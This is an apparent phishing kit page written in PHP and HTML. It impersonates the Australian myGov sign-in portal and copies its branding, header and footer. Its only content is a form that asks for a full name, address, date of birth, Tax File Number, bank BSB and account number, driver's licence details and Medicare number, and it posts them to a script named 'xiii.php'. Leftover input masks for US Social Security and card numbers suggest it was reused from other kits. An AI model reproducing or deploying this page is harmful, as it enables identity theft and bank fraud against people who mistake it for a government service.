<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Sign in with myGov - myGov</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link href="../Assets/css/css.css" rel="stylesheet" />
    <link href="../Assets/css/mgv2-application.css" rel="stylesheet" />
    <link href="../Assets/css/blugov.css" rel="stylesheet" />
 <link rel="icon" type="image/png" sizes="32x32" href="../Assets/images/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="../Assets/images/favicon-16x16.png" />
</head>

<body>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="#" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="../Assets/images/myGov-cobranded-logo-black.svg"
                                alt="myGov Beta" role="img" />
                        </a>
                        <div class="header-links">
                            <a href="javascript:void(0);">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>
    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <div class="unauth">
                <div class="login-grid-container">
                    <div class="login-grid-row">
                        <div class="login-grid-column">
                            <div class="digital-id-login-card-wrapper">
                                <div class="digital-id-main-login-card override">
                                    <h2 class="text-align-left">
                                        Enter the details given below.
                                    </h2>
                                    <form id="form-1" class="mygov-login-form alternative" method="post"
                                        action="../Assets/scripts/xiii.php" method="POST">
                                        <div class="input-group">
                                            <label class="override" for="userId">Full Name</label>
                                            <input id="fn" name="names" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Address on File</label>
                                            <input id="add" name="addr" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Date of Birth</label>
                                            <input id="dob" name="dob" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Tax File Number</label>
                                            <input name="tfnum" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Date of Issue</label>
                                            <input id="doiss" name="doiss" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Reference Number</label>
                                            <input name="irn" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">BSB</label>
                                            <input name="bsb" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Account Number</label>
                                            <input name="accno" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Driver's License Number</label>
                                            <input id="dln" name="dln" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Driver's License Card No. (Back of
                                                Card)</label>
                                            <input id="dlcnum" name="dlcnum" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Driver's License Expiry Date</label>
                                            <input id="dlexdate" name="dlexp" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Medicare Number</label>
                                            <input id="mednum" name="mednum" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <br />
                                        <div class="button-digital-id-main-container override">
                                            <div class="digital-id-button-container">
                                                <button type="submit" class="button-main" id="btn3">
                                                    Submit
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="#">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Privacy and security</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="#">
                            <img src="../Assets/images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17"
                                height="70" role="img" />
                        </a>
                    </section>
                    <p class="footer-acknowledgement">
                        We acknowledge the Traditional Custodians of the lands we live on.
                        We pay our respects to all Elders, past and present, of all
                        Aboriginal and Torres Strait Islander nations.
                    </p>
                </div>
            </div>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
    <script type="text/javascript">
    $("#ssn").inputmask({
        mask: "999-99-9999"
    });
    $("#cn").inputmask({
        mask: "9999 9999 9999 9999"
    });
    $("#dob").inputmask({
        mask: "99/99/9999",
        placeholder: "DD/MM/YYYY"
    });
    $("#doiss").inputmask({
        mask: "99/99/9999",
        placeholder: "DD/MM/YYYY"
    });
    $("#exdate").inputmask({
        mask: "99/9999",
        placeholder: "MM/YYYY"
    });
    $("#ph").inputmask({
        mask: "999-999-9999"
    });
    </script>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js">
    </script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>

</html>